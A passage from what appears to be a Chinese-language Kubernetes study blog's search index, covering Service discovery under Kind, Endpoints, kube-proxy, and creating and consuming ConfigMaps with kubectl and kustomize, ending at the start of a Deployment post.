30306/TCP</span><br><span class=\"line\">Endpoints:                10.244.0.6:8000</span><br><span class=\"line\">Session Affinity:         None</span><br><span class=\"line\">External Traffic Policy:  Cluster</span><br><span class=\"line\">Events:                   &lt;none&gt;</span><br></pre></td></tr></table></figure>\n<p>這邊注意，由於我們使用 Kind 做測試<br>使用 nodePort 發現怎麼連不到<br>後來我注意到 node ，不應該是指操作 kubectl 主機上 面</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get node -o wide</span><br></pre></td></tr></table></figure>\n<p>但是對 node 主機上 port 還是連不到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh &lt;ndoe_ip&gt; -L 8080:localhost:30306</span><br></pre></td></tr></table></figure>\n<p>不過看來 kind 不支源使用 nodeport</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/62432961/how-to-use-nodeport-with-kind\" target=\"_blank\" rel=\"noopener\">docker - How to use NodePort with kind? - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/63124127/kubernetes-nodeport-not-listening\" target=\"_blank\" rel=\"noopener\">nginx - Kubernetes NodePort not listening - Stack Overflow</a></li>\n</ul>\n<p>在考慮之後用 vagrant 環境跑跑看</p>\n<h2 id=\"LoadBalancer\"><a href=\"#LoadBalancer\" class=\"headerlink\" title=\"LoadBalancer\"></a>LoadBalancer</h2><p>一般雲端內件有提供這個功能<br>但好像也能自己架<br>這邊就不嘗試<br><a href=\"https://brobridge.com/bdsres/2019/10/31/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E5%BB%BA%E6%A7%8B-k8s-loadbalancer/\" target=\"_blank\" rel=\"noopener\">如何建構 Kubernetes loadbalancer – BROBRIDGE</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10221722\" target=\"_blank\" rel=\"noopener\">[Day12] 實作 Kubernetes 裸機 Load Balancer Part2 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<h2 id=\"Endpoint\"><a href=\"#Endpoint\" class=\"headerlink\" title=\"Endpoint\"></a>Endpoint</h2><p>創建 Service 會一同建立 Endpoint</p>\n<p>詳細:<a href=\"https://godleon.github.io/blog/Kubernetes/k8s-Service-Overview/\" target=\"_blank\" rel=\"noopener\">[Kubernetes] Service Overview | 小信豬的原始部落</a><br>感覺是 Service 底層操作元件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl describle endpints alpaca-prod</span><br><span class=\"line\"><span class=\"comment\"># Name:         alpaca-prod</span></span><br><span class=\"line\"><span class=\"comment\"># Namespace:    default</span></span><br><span class=\"line\"><span class=\"comment\"># Labels:       app=alpaca</span></span><br><span class=\"line\"><span class=\"comment\">#               env=prod</span></span><br><span class=\"line\"><span class=\"comment\">#               ver=1</span></span><br><span class=\"line\"><span class=\"comment\"># Annotations:  &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Subsets:</span></span><br><span class=\"line\"><span class=\"comment\">#   Addresses:          10.244.0.6</span></span><br><span class=\"line\"><span class=\"comment\">#   NotReadyAddresses:  &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#   Ports:</span></span><br><span class=\"line\"><span class=\"comment\">#     Name     Port  Protocol</span></span><br><span class=\"line\"><span class=\"comment\">#     ----     ----  --------</span></span><br><span class=\"line\"><span class=\"comment\">#     &lt;unset&gt;  8000  TCP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Events:  &lt;none&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get endpints alpaca-prod --watch</span><br><span class=\"line\"><span class=\"comment\"># NAME          ENDPOINTS         AGE</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-prod   10.244.0.6:8000   6d2h</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-prod   &lt;none&gt;            6d2h  &lt;--  kubectl delete pods alpaca-prod  </span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-prod   10.244.0.7:8000   6d2h  &lt;--  kubectl run alpaca-prod --image=gcr.io/kuar-demo/kuard-amd64:blue --port=8080 --labels=\"ver=1,app=alpaca,env=prod\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"建立-Service-yaml\"><a href=\"#建立-Service-yaml\" class=\"headerlink\" title=\"建立 Service yaml\"></a>建立 Service yaml</h2><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">my-service</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">MyApp</span></span><br><span class=\"line\"><span class=\"attr\">  ports:</span></span><br><span class=\"line\"><span class=\"attr\">    - protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"attr\">      targetPort:</span> <span class=\"number\">9376</span></span><br></pre></td></tr></table></figure>\n<p>簡單來說 Service 對印 selector 去抓含有 Label 的 <code>Pod</code></p>\n<h2 id=\"kube-proxy\"><a href=\"#kube-proxy\" class=\"headerlink\" title=\"kube-proxy\"></a>kube-proxy</h2><p>kube-proxy 每一台 node 主機上面都會有這個東西。<br>kube-proxy 會監測 service 和 endpoint 是否發生變化，會重寫該模組 iptables 規則。</p>\n<p>詳細:</p>\n<ul>\n<li><a href=\"https://feisky.gitbooks.io/kubernetes/content/components/kube-proxy.html\" target=\"_blank\" rel=\"noopener\">kube-proxy · Kubernetes指南</a></li>\n<li><a href=\"https://www.cnblogs.com/kevingrace/p/6655153.html\" target=\"_blank\" rel=\"noopener\">kubernetes核心组件kube-proxy - 运维笔记 - 散尽浮华 - 博客园</a><a href=\"/blog/2021/02/04/Kubernetes-服務探索-Service-Discovery/web1.png\" title=\"備份圖\">備份圖</a></li>\n</ul>\n<h2 id=\"Cluster-IP-環境變數\"><a href=\"#Cluster-IP-環境變數\" class=\"headerlink\" title=\"Cluster IP 環境變數\"></a>Cluster IP 環境變數</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl <span class=\"built_in\">exec</span> alpaca-prod -- env</span><br><span class=\"line\"><span class=\"comment\"># PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class=\"line\"><span class=\"comment\"># HOSTNAME=alpaca-prod</span></span><br><span class=\"line\"><span class=\"comment\"># KUBERNETES_PORT_443_TCP_PROTO=tcp</span></span><br><span class=\"line\"><span class=\"comment\"># ALPACA_PROD_PORT_8000_TCP_PROTO=tcp</span></span><br><span class=\"line\"><span class=\"comment\"># KUBERNETES_SERVICE_HOST=10.96.0.1</span></span><br><span class=\"line\"><span class=\"comment\"># KUBERNETES_PORT=tcp://10.96.0.1:443</span></span><br><span class=\"line\"><span class=\"comment\"># KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1</span></span><br><span class=\"line\"><span class=\"comment\"># ALPACA_PROD_PORT=tcp://10.99.141.81:8000</span></span><br><span class=\"line\"><span class=\"comment\"># ALPACA_PROD_PORT_8000_TCP_PORT=8000</span></span><br><span class=\"line\"><span class=\"comment\"># KUBERNETES_SERVICE_PORT_HTTPS=443</span></span><br><span class=\"line\"><span class=\"comment\"># KUBERNETES_PORT_443_TCP_PORT=443</span></span><br><span class=\"line\"><span class=\"comment\"># ALPACA_PROD_PORT_8000_TCP=tcp://10.99.141.81:8000</span></span><br><span class=\"line\"><span class=\"comment\"># ALPACA_PROD_PORT_8000_TCP_ADDR=10.99.141.81</span></span><br><span class=\"line\"><span class=\"comment\"># KUBERNETES_SERVICE_PORT=443</span></span><br><span class=\"line\"><span class=\"comment\"># KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443</span></span><br><span class=\"line\"><span class=\"comment\"># ALPACA_PROD_SERVICE_HOST=10.99.141.81</span></span><br><span class=\"line\"><span class=\"comment\"># ALPACA_PROD_SERVICE_PORT=8000</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"清除所有建立物件\"><a href=\"#清除所有建立物件\" class=\"headerlink\" title=\"清除所有建立物件\"></a>清除所有建立物件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看之前建立有app label 的 pods , services 狀態</span></span><br><span class=\"line\">kubectl get pods,services  -l app</span><br><span class=\"line\"><span class=\"comment\"># 刪除 app label 物件</span></span><br><span class=\"line\">kubectl delete services,deployments,pods -l app</span><br></pre></td></tr></table></figure>\n","categories":["Kubernetes"],"tags":["Kubernetes","Service"]},{"title":"Kubernetes 的 ConfigMap","url":"/blog/2021/03/03/Kubernetes-%E7%9A%84-ConfigMap/","content":"<a id=\"more\"></a>\n<h2 id=\"建立-Clusters\"><a href=\"#建立-Clusters\" class=\"headerlink\" title=\"建立 Clusters\"></a>建立 Clusters</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create configmap &lt;map-name&gt; &lt;data-source&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Create the local directory</span></span><br><span class=\"line\">mkdir -p configure-pod-container/configmap/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Download the sample files into `configure-pod-container/configmap/` directory</span></span><br><span class=\"line\">wget https://kubernetes.io/examples/configmap/game.properties -O configure-pod-container/configmap/game.properties</span><br><span class=\"line\">wget https://kubernetes.io/examples/configmap/ui.properties -O configure-pod-container/configmap/ui.properties</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Create the configmap</span></span><br><span class=\"line\">kubectl create configmap game-config --from-file=configure-pod-container/configmap/</span><br></pre></td></tr></table></figure>\n<p>這邊有點有趣，client 端做，nodes 竟然可以吃到抓下來的 properties<br>不知道底層原理怎麼做到</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get configmaps game-config -o yaml</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ConfigMap</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  creationTimestamp:</span> <span class=\"number\">2016</span><span class=\"bullet\">-02</span><span class=\"bullet\">-18</span><span class=\"attr\">T18:52:05Z</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">game-config</span></span><br><span class=\"line\"><span class=\"attr\">  namespace:</span> <span class=\"string\">default</span></span><br><span class=\"line\"><span class=\"attr\">  resourceVersion:</span> <span class=\"string\">\"516\"</span></span><br><span class=\"line\"><span class=\"attr\">  uid:</span> <span class=\"string\">b4952dc3-d670-11e5-8cd0-68f728db1985</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"string\">game.properties:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">    enemies=aliens</span></span><br><span class=\"line\"><span class=\"string\">    lives=3</span></span><br><span class=\"line\"><span class=\"string\">    enemies.cheat=true</span></span><br><span class=\"line\"><span class=\"string\">    enemies.cheat.level=noGoodRotten</span></span><br><span class=\"line\"><span class=\"string\">    secret.code.passphrase=UUDDLRLRBABAS</span></span><br><span class=\"line\"><span class=\"string\">    secret.code.allowed=true</span></span><br><span class=\"line\"><span class=\"string\">    secret.code.lives=30    </span></span><br><span class=\"line\"><span class=\"string\">  ui.properties: |</span></span><br><span class=\"line\"><span class=\"string\">    color.good=purple</span></span><br><span class=\"line\"><span class=\"string\">    color.bad=yellow</span></span><br><span class=\"line\"><span class=\"string\">    allow.textmode=true</span></span><br><span class=\"line\"><span class=\"string\">    how.nice.to.look=fairlyNice</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"從檔案建立-ConfigMap\"><a href=\"#從檔案建立-ConfigMap\" class=\"headerlink\" title=\"從檔案建立 ConfigMap\"></a>從檔案建立 ConfigMap</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create configmap game-config-2 --from-file=configure-pod-container/configmap/game.properties</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl describe configmaps game-config-2</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Name:         game-config-2</span><br><span class=\"line\">Namespace:    default</span><br><span class=\"line\">Labels:       &lt;none&gt;</span><br><span class=\"line\">Annotations:  &lt;none&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Data</span><br><span class=\"line\">====</span><br><span class=\"line\">game.properties:</span><br><span class=\"line\">----</span><br><span class=\"line\">enemies=aliens</span><br><span class=\"line\">lives=3</span><br><span class=\"line\">enemies.cheat=true</span><br><span class=\"line\">enemies.cheat.level=noGoodRotten</span><br><span class=\"line\">secret.code.passphrase=UUDDLRLRBABAS</span><br><span class=\"line\">secret.code.allowed=true</span><br><span class=\"line\">secret.code.lives=30</span><br><span class=\"line\">Events:  &lt;none&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 同時使用--from-file 載入多個檔案</span></span><br><span class=\"line\">kubectl create configmap game-config-2 --from-file=configure-pod-container/configmap/game.properties --from-file=configure-pod-container/configmap/ui.properties</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看 ConfigMap 內容</span></span><br><span class=\"line\">kubectl describe configmaps game-config-2</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Name:         game-config-2</span><br><span class=\"line\">Namespace:    default</span><br><span class=\"line\">Labels:       &lt;none&gt;</span><br><span class=\"line\">Annotations:  &lt;none&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Data</span><br><span class=\"line\">====</span><br><span class=\"line\">game.properties:</span><br><span class=\"line\">----</span><br><span class=\"line\">enemies=aliens</span><br><span class=\"line\">lives=3</span><br><span class=\"line\">enemies.cheat=true</span><br><span class=\"line\">enemies.cheat.level=noGoodRotten</span><br><span class=\"line\">secret.code.passphrase=UUDDLRLRBABAS</span><br><span class=\"line\">secret.code.allowed=true</span><br><span class=\"line\">secret.code.lives=30</span><br><span class=\"line\">ui.properties:</span><br><span class=\"line\">----</span><br><span class=\"line\">color.good=purple</span><br><span class=\"line\">color.bad=yellow</span><br><span class=\"line\">allow.textmode=true</span><br><span class=\"line\">how.nice.to.look=fairlyNice</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Download the sample files into `configure-pod-container/configmap/` directory</span></span><br><span class=\"line\">wget https://kubernetes.io/examples/configmap/game-env-file.properties -O configure-pod-container/configmap/game-env-file.properties</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The env-file `game-env-file.properties` looks like below</span></span><br><span class=\"line\">cat configure-pod-container/configmap/game-env-file.properties</span><br><span class=\"line\">enemies=aliens</span><br><span class=\"line\">lives=3</span><br><span class=\"line\">allowed=<span class=\"string\">\"true\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># This comment and the empty line above it are ignored</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get configmap game-config-env-file -o yaml</span><br><span class=\"line\"><span class=\"comment\"># apiVersion: v1</span></span><br><span class=\"line\"><span class=\"comment\"># kind: ConfigMap</span></span><br><span class=\"line\"><span class=\"comment\"># metadata:</span></span><br><span class=\"line\"><span class=\"comment\">#   creationTimestamp: 2017-12-27T18:36:28Z</span></span><br><span class=\"line\"><span class=\"comment\">#   name: game-config-env-file</span></span><br><span class=\"line\"><span class=\"comment\">#   namespace: default</span></span><br><span class=\"line\"><span class=\"comment\">#   resourceVersion: \"809965\"</span></span><br><span class=\"line\"><span class=\"comment\">#   uid: d9d1ca5b-eb34-11e7-887b-42010a8002b8</span></span><br><span class=\"line\"><span class=\"comment\"># data:</span></span><br><span class=\"line\"><span class=\"comment\">#   allowed: '\"true\"'</span></span><br><span class=\"line\"><span class=\"comment\">#   enemies: aliens</span></span><br><span class=\"line\"><span class=\"comment\">#   lives: \"3\"</span></span><br></pre></td></tr></table></figure>\n<p>使用多個<code>--from-env-file</code> </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Download the sample files into `configure-pod-container/configmap/` directory</span></span><br><span class=\"line\">wget https://kubernetes.io/examples/configmap/ui-env-file.properties -O configure-pod-container/configmap/ui-env-file.properties</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Create the configmap</span></span><br><span class=\"line\">kubectl create configmap config-multi-env-files \\</span><br><span class=\"line\">        --from-env-file=configure-pod-container/configmap/game-env-file.properties \\</span><br><span class=\"line\">        --from-env-file=configure-pod-container/configmap/ui-env-file.properties</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get configmap config-multi-env-files -o yaml</span><br><span class=\"line\"><span class=\"comment\"># apiVersion: v1</span></span><br><span class=\"line\"><span class=\"comment\"># kind: ConfigMap</span></span><br><span class=\"line\"><span class=\"comment\"># metadata:</span></span><br><span class=\"line\"><span class=\"comment\">#   creationTimestamp: 2017-12-27T18:38:34Z</span></span><br><span class=\"line\"><span class=\"comment\">#   name: config-multi-env-files</span></span><br><span class=\"line\"><span class=\"comment\">#   namespace: default</span></span><br><span class=\"line\"><span class=\"comment\">#   resourceVersion: \"810136\"</span></span><br><span class=\"line\"><span class=\"comment\">#   uid: 252c4572-eb35-11e7-887b-42010a8002b8</span></span><br><span class=\"line\"><span class=\"comment\"># data:</span></span><br><span class=\"line\"><span class=\"comment\">#   color: purple</span></span><br><span class=\"line\"><span class=\"comment\">#   how: fairlyNice</span></span><br><span class=\"line\"><span class=\"comment\">#   textmode: \"true\"</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#kubectl create configmap game-config-3 --from-file=&lt;my-key-name&gt;=&lt;path-to-file&gt;</span></span><br><span class=\"line\">kubectl create configmap game-config-3 --from-file=game-special-key=configure-pod-container/configmap/game.properties</span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get configmaps game-config-3 -o yaml</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># apiVersion: v1</span></span><br><span class=\"line\"><span class=\"comment\"># kind: ConfigMap</span></span><br><span class=\"line\"><span class=\"comment\"># metadata:</span></span><br><span class=\"line\"><span class=\"comment\">#   creationTimestamp: 2016-02-18T18:54:22Z</span></span><br><span class=\"line\"><span class=\"comment\">#   name: game-config-3</span></span><br><span class=\"line\"><span class=\"comment\">#   namespace: default</span></span><br><span class=\"line\"><span class=\"comment\">#   resourceVersion: \"530\"</span></span><br><span class=\"line\"><span class=\"comment\">#   uid: 05f8da22-d671-11e5-8cd0-68f728db1985</span></span><br><span class=\"line\"><span class=\"comment\"># data:</span></span><br><span class=\"line\"><span class=\"comment\">#   game-special-key: |</span></span><br><span class=\"line\"><span class=\"comment\">#     enemies=aliens</span></span><br><span class=\"line\"><span class=\"comment\">#     lives=3</span></span><br><span class=\"line\"><span class=\"comment\">#     enemies.cheat=true</span></span><br><span class=\"line\"><span class=\"comment\">#     enemies.cheat.level=noGoodRotten</span></span><br><span class=\"line\"><span class=\"comment\">#     secret.code.passphrase=UUDDLRLRBABAS</span></span><br><span class=\"line\"><span class=\"comment\">#     secret.code.allowed=true</span></span><br><span class=\"line\"><span class=\"comment\">#     secret.code.lives=30</span></span><br></pre></td></tr></table></figure>\n<p>指令內文 key</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create configmap special-config --from-literal=special.how=very --from-literal=special.type=charm</span><br><span class=\"line\">kubectl get configmaps special-config -o yaml</span><br><span class=\"line\"><span class=\"comment\"># apiVersion: v1</span></span><br><span class=\"line\"><span class=\"comment\"># kind: ConfigMap</span></span><br><span class=\"line\"><span class=\"comment\"># metadata:</span></span><br><span class=\"line\"><span class=\"comment\">#   creationTimestamp: 2016-02-18T19:14:38Z</span></span><br><span class=\"line\"><span class=\"comment\">#   name: special-config</span></span><br><span class=\"line\"><span class=\"comment\">#   namespace: default</span></span><br><span class=\"line\"><span class=\"comment\">#   resourceVersion: \"651\"</span></span><br><span class=\"line\"><span class=\"comment\">#   uid: dadce046-d673-11e5-8cd0-68f728db1985</span></span><br><span class=\"line\"><span class=\"comment\"># data:</span></span><br><span class=\"line\"><span class=\"comment\">#   special.how: very</span></span><br><span class=\"line\"><span class=\"comment\">#   special.type: charm</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Create a kustomization.yaml file with ConfigMapGenerator</span></span><br><span class=\"line\">cat &lt;&lt;EOF &gt;./kustomization.yaml</span><br><span class=\"line\">configMapGenerator:</span><br><span class=\"line\">- name: game-config-4</span><br><span class=\"line\">  files:</span><br><span class=\"line\">  - configure-pod-container/configmap/game.properties</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">kubectl apply -k .</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">kubectl describe configmaps/game-config-4-m9dm2f92bt</span><br></pre></td></tr></table></figure>\n<p>定義 key Mapping 到 檔案</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Create a kustomization.yaml file with ConfigMapGenerator</span></span><br><span class=\"line\">cat &lt;&lt;EOF &gt;./kustomization.yaml</span><br><span class=\"line\">configMapGenerator:</span><br><span class=\"line\">- name: game-config-5</span><br><span class=\"line\">  files:</span><br><span class=\"line\">  - game-special-key=configure-pod-container/configmap/game.properties</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">kubectl apply -k .</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Create a kustomization.yaml file with ConfigMapGenerator</span><br><span class=\"line\">cat &lt;&lt;EOF &gt;./kustomization.yaml</span><br><span class=\"line\">configMapGenerator:</span><br><span class=\"line\">- name: special-config-2</span><br><span class=\"line\">  literals:</span><br><span class=\"line\">  - special.how=very</span><br><span class=\"line\">  - special.type=charm</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">kubectl apply -k .</span><br></pre></td></tr></table></figure>\n<h2 id=\"在-Pod-使用-ConfigMap\"><a href=\"#在-Pod-使用-ConfigMap\" class=\"headerlink\" title=\"在 Pod 使用 ConfigMap\"></a>在 Pod 使用 ConfigMap</h2><h3 id=\"使用環境變數\"><a href=\"#使用環境變數\" class=\"headerlink\" title=\"使用環境變數\"></a>使用環境變數</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create configmap special-config --from-literal=special.how=very</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">dapi-test-pod</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">    - name:</span> <span class=\"string\">test-container</span></span><br><span class=\"line\"><span class=\"attr\">      image:</span> <span class=\"string\">k8s.gcr.io/busybox</span></span><br><span class=\"line\"><span class=\"attr\">      command:</span> <span class=\"string\">[</span> <span class=\"string\">\"/bin/sh\"</span><span class=\"string\">,</span> <span class=\"string\">\"-c\"</span><span class=\"string\">,</span> <span class=\"string\">\"env\"</span> <span class=\"string\">]</span></span><br><span class=\"line\"><span class=\"attr\">      env:</span></span><br><span class=\"line\">        <span class=\"comment\"># Define the environment variable</span></span><br><span class=\"line\"><span class=\"attr\">        - name:</span> <span class=\"string\">SPECIAL_LEVEL_KEY</span></span><br><span class=\"line\"><span class=\"attr\">          valueFrom:</span></span><br><span class=\"line\"><span class=\"attr\">            configMapKeyRef:</span></span><br><span class=\"line\">              <span class=\"comment\"># The ConfigMap containing the value you want to assign to SPECIAL_LEVEL_KEY</span></span><br><span class=\"line\"><span class=\"attr\">              name:</span> <span class=\"string\">special-config</span></span><br><span class=\"line\">              <span class=\"comment\"># Specify the key associated with the value</span></span><br><span class=\"line\"><span class=\"attr\">              key:</span> <span class=\"string\">special.how</span></span><br><span class=\"line\"><span class=\"attr\">  restartPolicy:</span> <span class=\"string\">Never</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create -f https://kubernetes.io/examples/pods/pod-single-configmap-env-variable.yaml</span><br></pre></td></tr></table></figure>\n<p>使用多個 ConfigMap</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: ConfigMap</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: special-config</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\">data:</span><br><span class=\"line\">  special.how: very</span><br><span class=\"line\">---</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: ConfigMap</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: env-config</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\">data:</span><br><span class=\"line\">  log_level: INFO</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create -f https://kubernetes.io/examples/configmap/configmaps.yaml</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">dapi-test-pod</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">    - name:</span> <span class=\"string\">test-container</span></span><br><span class=\"line\"><span class=\"attr\">      image:</span> <span class=\"string\">k8s.gcr.io/busybox</span></span><br><span class=\"line\"><span class=\"attr\">      command:</span> <span class=\"string\">[</span> <span class=\"string\">\"/bin/sh\"</span><span class=\"string\">,</span> <span class=\"string\">\"-c\"</span><span class=\"string\">,</span> <span class=\"string\">\"env\"</span> <span class=\"string\">]</span></span><br><span class=\"line\"><span class=\"attr\">      env:</span></span><br><span class=\"line\"><span class=\"attr\">        - name:</span> <span class=\"string\">SPECIAL_LEVEL_KEY</span></span><br><span class=\"line\"><span class=\"attr\">          valueFrom:</span></span><br><span class=\"line\"><span class=\"attr\">            configMapKeyRef:</span></span><br><span class=\"line\"><span class=\"attr\">              name:</span> <span class=\"string\">special-config</span></span><br><span class=\"line\"><span class=\"attr\">              key:</span> <span class=\"string\">special.how</span></span><br><span class=\"line\"><span class=\"attr\">        - name:</span> <span class=\"string\">LOG_LEVEL</span></span><br><span class=\"line\"><span class=\"attr\">          valueFrom:</span></span><br><span class=\"line\"><span class=\"attr\">            configMapKeyRef:</span></span><br><span class=\"line\"><span class=\"attr\">              name:</span> <span class=\"string\">env-config</span></span><br><span class=\"line\"><span class=\"attr\">              key:</span> <span class=\"string\">log_level</span></span><br><span class=\"line\"><span class=\"attr\">  restartPolicy:</span> <span class=\"string\">Never</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create -f https://kubernetes.io/examples/pods/pod-multiple-configmap-env-variable.yaml</span><br></pre></td></tr></table></figure>\n<p>TODO: <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/#define-container-environment-variables-with-data-from-multiple-configmaps\" target=\"_blank\" rel=\"noopener\">https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/#define-container-environment-variables-with-data-from-multiple-configmaps</a></p>\n","categories":["Kuberenetes"],"tags":["configmap"]},{"title":"Kubernetes 的 Deployment","url":"/blog/2021/02/14/Kubernetes-%E7%9A%84-Deployment/","content":"<p>感覺是滿多的功能<br>但頁數比較想像中的少<br>趕緊消化</p>\n<a id=\"more\"></a>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>ReplicaSet 單元最後看到使用 Deployment<br>想說怎麼不直接教 Deployment<br>實作簡單功能，發現原來 